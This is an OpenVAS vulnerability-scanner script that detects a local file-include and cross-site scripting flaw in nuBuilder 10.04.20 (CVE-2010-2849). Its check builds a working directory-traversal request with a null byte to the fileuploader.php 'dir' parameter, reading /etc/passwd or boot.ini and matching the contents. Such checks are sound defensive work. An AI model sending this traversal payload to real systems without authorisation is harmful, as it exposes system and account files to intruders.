###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nuBuilder_41404.nasl 14 2013-10-27 12:33:37Z jan $
#
# nuBuilder Local File Include and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "nuBuilder is prone to a local file-include vulnerability and a cross-
site scripting vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit the local file-include vulnerability using
directory-traversal strings to view and execute local files within
the context of the webserver process. Information harvested may aid
in further attacks.

The attacker may leverage the cross-site scripting issue to execute
arbitrary script code in the browser of an unsuspecting user in the
context of the affected site. This may let the attacker steal cookie-
based authentication credentials and launch other attacks.

nuBuilder 10.04.20 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100704);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-07-07 12:47:04 +0200 (Wed, 07 Jul 2010)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-2849");
 script_bugtraq_id(41404);

 script_name("nuBuilder Local File Include and Cross Site Scripting Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41404");
 script_xref(name : "URL" , value : "http://cross-site-scripting.blogspot.com/2010/07/nubuilder-100420-local-file-inclusion.html");
 script_xref(name : "URL" , value : "http://cross-site-scripting.blogspot.com/2010/07/nubuilder-100420-reflected-xss.html");
 script_xref(name : "URL" , value : "http://www.nubuilder.com/nubuilderwww/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if nuBuilder is prone to a local file-include vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/nubuilder",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");


foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir,"/productionnu2/fileuploader.php?dir=../../../../../../../../../../../",files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_warning(port:port);
      exit(0);

    }
  }
}
  
exit(0);